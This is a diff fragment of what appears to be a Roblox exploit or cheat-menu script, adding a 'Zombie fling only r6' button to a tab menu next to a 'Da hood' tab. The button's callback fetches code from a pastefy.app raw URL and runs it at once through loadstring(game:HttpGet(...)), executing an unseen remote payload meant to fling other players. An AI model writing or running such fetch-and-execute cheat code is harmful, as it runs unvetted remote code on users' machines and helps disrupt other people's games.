@@ -636,6 +636,19 @@ Name = <string> - The name of the button.
 Callback = <function> - The function of the button.
 ]]
 
+Tab:AddButton({
+	Name = "Zombie fling only r6",
+	Callback = function()
+      		print("button pressed")
+loadstring(game:HttpGet(('https://pastefy.app/w7KnPY70/raw'),true))()
+  	end    
+})
+
+--[[
+Name = <string> - The name of the button.
+Callback = <function> - The function of the button.
+]]
+
 local Tab = Window:MakeTab({
 	Name = "Da hood",
 	Icon = "rbxassetid://4483345998",
